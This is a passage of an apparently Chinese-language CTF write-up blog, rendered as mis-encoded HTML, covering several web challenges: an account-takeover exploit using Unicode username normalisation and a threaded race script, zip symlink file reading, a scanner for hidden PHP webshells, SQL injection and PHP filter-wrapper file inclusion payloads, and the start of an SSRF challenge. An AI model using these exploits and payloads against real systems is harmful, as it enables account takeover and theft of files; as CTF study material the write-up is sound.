successful&apos;)\n        return redirect(url_for(&apos;login&apos;))\n    return render_template(&apos;register.html&apos;, title = &apos;register&apos;, form = form)\n\n@app.route(&apos;/login&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])\ndef login():\n    if current_user.is_authenticated:\n        return redirect(url_for(&apos;index&apos;))\n\n    form = LoginForm()\n    if request.method == &apos;POST&apos;:\n        **name = strlower(form.username.data)**\n        session[&apos;name&apos;] = name\n        user = User.query.filter_by(username=name).first()\n        if user is None or not user.check_password(form.password.data):\n            flash(&apos;Invalid username or password&apos;)\n            return redirect(url_for(&apos;login&apos;))\n        login_user(user, remember=form.remember_me.data)\n        return redirect(url_for(&apos;index&apos;))\n    return render_template(&apos;login.html&apos;, title = &apos;login&apos;, form = form)\n\n@app.route(&apos;/change&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])\ndef change():\n    if not current_user.is_authenticated:\n        return redirect(url_for(&apos;login&apos;))\n    form = NewpasswordForm()\n    if request.method == &apos;POST&apos;:\n        **name = strlower(session[&apos;name&apos;])**\n        user = User.query.filter_by(username=name).first()\n        user.set_password(form.newpassword.data)\n        db.session.commit()\n        flash(&apos;change successful&apos;)\n        return redirect(url_for(&apos;index&apos;))\n    return render_template(&apos;change.html&apos;, title = &apos;change&apos;, form = form)</code></pre><p>python å·²ç»æœ‰äº†è‡ªå·±çš„ lower() å‡½æ•°ä¸ç”¨ï¼Œç”¨äº†è‡ªå·±å®šä¹‰çš„ strlower() ï¼Œè¿›åˆ°è¿™ä¸ªå‡½æ•°ï¼š</p>\n<pre><code>def strlower(username):\n    username = nodeprep.prepare(username)\n    return username</code></pre><p>å¯ä»¥çœ‹åˆ° <code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code> è¿™ä¸ªå‡½æ•°æ¥è‡ª twisted ,è€Œé¢˜ç›®ä¸­ <code>Twisted==10.2.0</code> ,ç‰ˆæœ¬å·®è·æœ‰ç‚¹å¤§ã€‚</p>\n<p>å¯¹äºä¸€äº›å­—ç¬¦ï¼Œ<a href=\"https://unicode-table.com/en/search/?q=small+capital\" target=\"_blank\" rel=\"noopener\">https://unicode-table.com/en/search/?q=small+capital</a> è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯</p>\n<pre><code>á´€ -&gt; A -&gt; a</code></pre><p>æˆ‘ä»¬åœ¨ä¸Šé¢çš„ç½‘ç«™ä¸Šæ‰¾åˆ°ä¸€ä¸ª <code>Ä</code> ï¼Œç„¶åæ³¨å†Œ <code>Ädmin</code> ,æ­¤æ—¶ç»è¿‡ä¸€æ¬¡ <code>strlower()</code> å˜ä¸º <code>ADMIN</code> ï¼Œä¹‹åæˆ‘ä»¬ç™»é™† <code>ADMIN</code> ï¼Œå†ç»è¿‡ä¸€æ¬¡ <code>strlower()</code> å°±æˆä¸ºäº† <code>admin</code> ã€‚</p>\n<h3 id=\"æ¡ä»¶ç«äº‰\"><a href=\"#æ¡ä»¶ç«äº‰\" class=\"headerlink\" title=\"æ¡ä»¶ç«äº‰\"></a>æ¡ä»¶ç«äº‰</h3><p>å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·ç„¶åå¼€ä¸€ä¸ªçº¿ç¨‹æ”¹å¯†ç ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ admin ç™»é™†ï¼Œåœ¨æŸä¸€ç¬é—´ç”Ÿæˆ admin çš„session æ—¶æˆ‘ä»¬æ”¹å¯†ç çš„æ“ä½œä¹Ÿåˆ°äº†ï¼Œè¿™æ—¶å°±å¯ä»¥ä¿®æ”¹å¯†ç äº†</p>\n<pre><code>exp.py\n\nimport requests\nimport threading\n\ndef login(s, username, password):\n    data = {\n        &apos;username&apos;: username,\n        &apos;password&apos;: password,\n        &apos;submit&apos;: &apos;&apos;\n    }\n    return s.post(&quot;http://admin.2018.hctf.io/login&quot;, data=data)\n\ndef logout(s):\n    return s.get(&quot;http://admin.2018.hctf.io/logout&quot;)\n\ndef change(s, newpassword):\n    data = {\n        &apos;newpassword&apos;:newpassword\n    }\n    return s.post(&quot;http://admin.2018.hctf.io/change&quot;, data=data)\n\ndef func1(s):\n    login(s, &apos;skysec&apos;, &apos;skysec&apos;)\n    change(s, &apos;skysec&apos;)\n\ndef func2(s):\n    logout(s)\n    res = login(s, &apos;admin&apos;, &apos;skysec&apos;)\n    if &apos;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&apos; in res.text:\n        print(&apos;finish&apos;)\n\ndef main():\n    for i in range(1000):\n        print(i)\n        s = requests.Session()\n        t1 = threading.Thread(target=func1, args=(s,))\n        t2 = threading.Thread(target=func2, args=(s,))\n        t1.start()\n        t2.start()\n\nif __name__ == &quot;__main__&quot;:\n    main()</code></pre><h3 id=\"hide-and-seak\"><a href=\"#hide-and-seak\" class=\"headerlink\" title=\"hide_and_seak\"></a>hide_and_seak</h3><p><strong>zipè½¯è¿æ¥è¯»å–æ–‡ä»¶</strong></p>\n<p>Linux lnå‘½ä»¤æ˜¯ä¸€ä¸ªéå¸¸é‡è¦å‘½ä»¤ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯ä¸ºæŸä¸€ä¸ªæ–‡ä»¶åœ¨å¦å¤–ä¸€ä¸ªä½ç½®å»ºç«‹ä¸€ä¸ªåŒæ­¥çš„é“¾æ¥ã€‚   å½“æˆ‘ä»¬éœ€è¦åœ¨ä¸åŒçš„ç›®å½•ï¼Œç”¨åˆ°ç›¸åŒçš„æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬ä¸éœ€è¦åœ¨æ¯ä¸€ä¸ªéœ€è¦çš„ç›®å½•ä¸‹éƒ½æ”¾ä¸€ä¸ªå¿…é¡»ç›¸åŒçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬åªè¦åœ¨æŸä¸ªå›ºå®šçš„ç›®å½•ï¼Œæ”¾ä¸Šè¯¥æ–‡ä»¶ï¼Œç„¶ååœ¨ å…¶å®ƒçš„ç›®å½•ä¸‹ç”¨lnå‘½ä»¤é“¾æ¥ï¼ˆlinkï¼‰å®ƒå°±å¯ä»¥ï¼Œä¸å¿…é‡å¤çš„å ç”¨ç£ç›˜ç©ºé—´ã€‚</p>\n<p>Linuxæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæœ‰æ‰€è°“çš„é“¾æ¥(link)ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶è§†ä¸ºæ¡£æ¡ˆçš„åˆ«åï¼Œè€Œé“¾æ¥åˆå¯åˆ†ä¸ºä¸¤ç§ : ç¡¬é“¾æ¥(hard link)ä¸è½¯é“¾æ¥(symbolic link)ï¼Œç¡¬é“¾æ¥çš„æ„æ€æ˜¯ä¸€ä¸ªæ¡£æ¡ˆå¯ä»¥æœ‰å¤šä¸ªåç§°ï¼Œè€Œè½¯é“¾æ¥çš„æ–¹å¼åˆ™æ˜¯äº§ç”Ÿä¸€ä¸ªç‰¹æ®Šçš„æ¡£æ¡ˆï¼Œè¯¥æ¡£æ¡ˆçš„å†…å®¹æ˜¯æŒ‡å‘å¦ä¸€ä¸ªæ¡£æ¡ˆçš„ä½ç½®ã€‚ç¡¬é“¾æ¥æ˜¯å­˜åœ¨åŒä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œè€Œè½¯é“¾æ¥å´å¯ä»¥è·¨è¶Šä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿã€‚</p>\n<p>è½¯é“¾æ¥ï¼š</p>\n<pre><code>1.è½¯é“¾æ¥ï¼Œä»¥è·¯å¾„çš„å½¢å¼å­˜åœ¨ã€‚ç±»ä¼¼äºWindowsæ“ä½œç³»ç»Ÿä¸­çš„å¿«æ·æ–¹å¼\n2.è½¯é“¾æ¥å¯ä»¥ è·¨æ–‡ä»¶ç³»ç»Ÿ ï¼Œç¡¬é“¾æ¥ä¸å¯ä»¥\n3.è½¯é“¾æ¥å¯ä»¥å¯¹ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶åè¿›è¡Œé“¾æ¥\n4.è½¯é“¾æ¥å¯ä»¥å¯¹ç›®å½•è¿›è¡Œé“¾æ¥</code></pre><p>ç¡¬é“¾æ¥ï¼š</p>\n<pre><code>1.ç¡¬é“¾æ¥ï¼Œä»¥æ–‡ä»¶å‰¯æœ¬çš„å½¢å¼å­˜åœ¨ã€‚ä½†ä¸å ç”¨å®é™…ç©ºé—´ã€‚\n2.ä¸å…è®¸ç»™ç›®å½•åˆ›å»ºç¡¬é“¾æ¥\n3.ç¡¬é“¾æ¥åªæœ‰åœ¨åŒä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­æ‰èƒ½åˆ›å»º</code></pre><p>æˆ‘ä»¬å°è¯•ç”Ÿæˆä¸€ä¸ªè½¯è¿æ¥</p>\n<pre><code>/tmp# ln -s test.txt test\n      ll\nlrwxrwxrwx  1 root  root 8 11æœˆ  7 17:41 test -&gt; test.txt\n-rw-r--r--  1 root  root12 11æœˆ  7 17:41 test.txt\n\n/tmp# cat test\nhello world\n\n/tmp# cat test.txt\nhello world</code></pre><p>å°è¯•è¯»å–æ–‡ä»¶å†…å®¹ï¼š</p>\n<pre><code>php -r &quot;echo file_get_contents(&apos;test.txt&apos;);&quot;\nhello world\n\nphp -r &quot;echo file_get_contents(&apos;test&apos;);&quot;\nhello world</code></pre><p>ç„¶åæˆ‘ä»¬å°è¯•è¿›è¡Œå‹ç¼© â€“symlinks å³ç”Ÿæˆè½¯è¿æ¥</p>\n<pre><code>zip --symlinks test.zip test</code></pre><h3 id=\"å¼ºç½‘æ¯-é«˜æ˜çš„é»‘å®¢\"><a href=\"#å¼ºç½‘æ¯-é«˜æ˜çš„é»‘å®¢\" class=\"headerlink\" title=\"å¼ºç½‘æ¯-é«˜æ˜çš„é»‘å®¢\"></a>å¼ºç½‘æ¯-é«˜æ˜çš„é»‘å®¢</h3><p>æ‰“å¼€ä¹‹åæç¤ºæˆ‘ä»¬ä¸‹è½½æºç ï¼Œä¸‹è½½å®Œå‘ç°æ˜¯ä¸€ä¸ªæœ‰ 3002 ä¸ªphpæ–‡ä»¶çš„æ–‡ä»¶å¤¹ã€‚</p>\n<p>æŸ¥çœ‹æ–‡ä»¶å†…å®¹åå‘ç°ä»£ç éš¾ä»¥é˜…è¯»ï¼Œåšäº†å¾ˆå¤šæ··æ·†ï¼Œä½†æ˜¯é‡Œé¢å……æ»¡äº† <code>$_GET &amp; $_POST</code> ä»¥åŠ <code>evalã€execã€assert...</code> å¯ä»¥çœ‹å‡ºæ¥è¿™åº”è¯¥è—äº†ä¸€ä¸ªshellï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠå¯ç”¨çš„ shell æ‰¾å‡ºæ¥</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing.dummy <span class=\"keyword\">import</span> Pool <span class=\"keyword\">as</span> ThreadPool</span><br><span class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime</span><br><span class=\"line\"></span><br><span class=\"line\">target_path = []</span><br><span class=\"line\">path = <span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\é«˜æ˜çš„é»‘å®¢\\www\\src\"</span></span><br><span class=\"line\">count = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> filename <span class=\"keyword\">in</span> os.listdir(path):</span><br><span class=\"line\">    <span class=\"comment\"># print(os.path.join(path, filename))</span></span><br><span class=\"line\">    target_path.append(filename)</span><br><span class=\"line\">    <span class=\"comment\"># count += 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(target_path)</span></span><br><span class=\"line\"><span class=\"comment\"># print(count)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(target)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># params = &#123;&#125;</span></span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\é«˜æ˜çš„é»‘å®¢\\www\\src\\\\\"</span>+ target, <span class=\"string\">\"r\"</span>, encoding=<span class=\"string\">\"utf-8\"</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        text = f.read()</span><br><span class=\"line\">        Get = list(re.findall(<span class=\"string\">'\\$_GET\\[\\'(.*?)\\'\\]'</span>, text))  <span class=\"comment\"># å¾—åˆ°å½“å‰æ–‡ä»¶å†…æ‰€æœ‰çš„ GET å‚æ•°</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">        for param in Get:</span></span><br><span class=\"line\"><span class=\"string\">            params[param] = 'echo(\"2333\");'  # å°†æ­£åˆ™åˆ°çš„æ‰€æœ‰å‚æ•°éƒ½åŠ ä¸Šå‚æ•°</span></span><br><span class=\"line\"><span class=\"string\">        # print(params)</span></span><br><span class=\"line\"><span class=\"string\">        \"\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> Get:</span><br><span class=\"line\">            url = <span class=\"string\">\"http://127.0.0.1/buu/src/\"</span></span><br><span class=\"line\">            new_url = <span class=\"string\">\"%s%s?%s=%s\"</span> % (url, target_path, i, <span class=\"string\">'echo \"2333\"'</span>)</span><br><span class=\"line\">            r = requests.get(new_url)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"2333\"</span> <span class=\"keyword\">in</span> r.text:  <span class=\"comment\"># å¸¦å‚æ•°è®¿é—®åæ£€æŸ¥æ˜¯å¦æœ‰å‚æ•°è¾“å‡º</span></span><br><span class=\"line\">                print(<span class=\"string\">\"++++++++++++++++++++++++++++GET find it! in \"</span> + target_path)</span><br><span class=\"line\">                result.append(target_path)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                print(<span class=\"string\">\"GET No ! in \"</span> + target_path + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">                print(r.url + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">            r.close()</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span><span class=\"params\">(target_path)</span>:</span></span><br><span class=\"line\">    data = &#123;&#125;</span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\é«˜æ˜çš„é»‘å®¢\\www\\src\\\\\"</span> + target_path, <span class=\"string\">\"r\"</span>, encoding=<span class=\"string\">\"utf-8\"</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        text = f.read()</span><br><span class=\"line\">        Get = list(re.findall(<span class=\"string\">'\\$_GET\\[\\'(.*?)\\'\\]'</span>, text))  <span class=\"comment\"># å¾—åˆ°å½“å‰æ–‡ä»¶å†…æ‰€æœ‰çš„ GET å‚æ•°</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">        for param in Get:</span></span><br><span class=\"line\"><span class=\"string\">            data[param] = 'print_r(\"2333\")'  # å°†æ­£åˆ™åˆ°çš„æ‰€æœ‰å‚æ•°éƒ½åŠ ä¸Šå‚æ•°</span></span><br><span class=\"line\"><span class=\"string\">        # print(params)</span></span><br><span class=\"line\"><span class=\"string\">        \"\"\"</span></span><br><span class=\"line\">        url = <span class=\"string\">\"http://127.0.0.1/buu/src/\"</span></span><br><span class=\"line\">        r = requests.post(url + target_path, data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"2333\"</span> <span class=\"keyword\">in</span> r.text:  <span class=\"comment\"># å¸¦å‚æ•°è®¿é—®åæ£€æŸ¥æ˜¯å¦æœ‰å‚æ•°è¾“å‡º</span></span><br><span class=\"line\">            print(<span class=\"string\">\"++++++++++++++++++++++++++++POST find it! in \"</span> + target_path)</span><br><span class=\"line\">            result.append(target_path)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"POST No ! in \"</span> + target_path + <span class=\"string\">\"\\r\\n\"</span>)</span><br><span class=\"line\">        r.close()</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">t1 = datetime.now()</span><br><span class=\"line\"></span><br><span class=\"line\">pool = ThreadPool(processes=<span class=\"number\">20</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> target_path:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        results = pool.apply_async(get, i)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        print(e)</span><br><span class=\"line\">pool.close()</span><br><span class=\"line\">pool.join()</span><br><span class=\"line\"></span><br><span class=\"line\">print(<span class=\"string\">'Multiprocess Scanning Completed in  '</span>, datetime.now() - t1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    get(target_path)</span><br><span class=\"line\">    post(target_path)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>æå–å®Œæ‰€æœ‰çš„ <code>GETå’ŒPOST</code> å‚æ•°ä¹‹åæ”¾åœ¨æœ¬åœ°è®¿é—®ï¼Œå¦‚æœæˆ‘ä»¬åŠ çš„å‚æ•°æˆåŠŸ <code>echo</code> äº†ï¼Œè¯´æ˜æ‰¾åˆ°å¯ç”¨ shell ï¼Œéšå <code>cat /flag</code> å³å¯ã€‚</p>\n<h3 id=\"EasySQL\"><a href=\"#EasySQL\" class=\"headerlink\" title=\"EasySQL\"></a>EasySQL</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&apos; 123</span><br><span class=\"line\">to use near &apos;123&apos;&apos; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">1&apos; or 1=1   123</span><br><span class=\"line\">use near &apos; &apos; and password=&apos;123&apos; &apos; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">1&apos; or 1=1# 123</span><br></pre></td></tr></table></figure>\n\n<p>ç™»é™†å°±æœ‰flag.</p>\n<h3 id=\"Havefun\"><a href=\"#Havefun\" class=\"headerlink\" title=\"Havefun\"></a>Havefun</h3><p>æŸ¥çœ‹æºç å‘ç°</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$cat=$_GET[<span class=\"string\">'cat'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $cat;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($cat==<span class=\"string\">'dog'</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>GET</code>ä¼ å‚</p>\n<h3 id=\"Secret-File\"><a href=\"#Secret-File\" class=\"headerlink\" title=\"Secret File\"></a>Secret File</h3><p><strong>F12</strong>æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œç›‘è§†ç½‘ç»œï¼Œå‘ç°åœ¨è¿ç»­çš„ä¸‰ä¸ªé¡µé¢ä¸­é—´æœ‰ä¸€ä¸ª302è·³è½¬ï¼Œæˆ‘ä»¬æŠ“åŒ…ä¹‹åå‘ç°è·³è½¬é¡µé¢çš„æ³¨é‡Šä¸­ç»™äº†ä¸€ä¸ªæ–‡ä»¶å <code>secr3t.php</code> ,è®¿é—®å¾—åˆ°ä»£ç </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">\"UTF-8\"</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">    $file=$_GET[<span class=\"string\">'file'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strstr($file,<span class=\"string\">\"../\"</span>)||stristr($file, <span class=\"string\">\"tp\"</span>)||stristr($file,<span class=\"string\">\"input\"</span>)||stristr($file,<span class=\"string\">\"data\"</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Oh no!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">include</span>($file); </span><br><span class=\"line\"><span class=\"comment\">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>php ä¼ªåè®®è¯»æ–‡ä»¶ä¹‹åå†è§£ç å³å¯ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:<span class=\"comment\">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ç½‘é¼æ¯-Fakebook\"><a href=\"#ç½‘é¼æ¯-Fakebook\" class=\"headerlink\" title=\"ç½‘é¼æ¯-Fakebook\"></a>ç½‘é¼æ¯-Fakebook</h3><p>æ‰«ç›®å½•å¾—åˆ° robots.txt </p>\n<p><code>/user.php.bak</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $blog = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($name, $age, $blog)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;name = $name;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age = (int)$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;blog = $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\"></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        $output = curl_exec($ch);</span><br><span class=\"line\">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($httpCode == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">404</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getBlogContents</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get(<span class=\"keyword\">$this</span>-&gt;blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isValidBlog</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $blog = <span 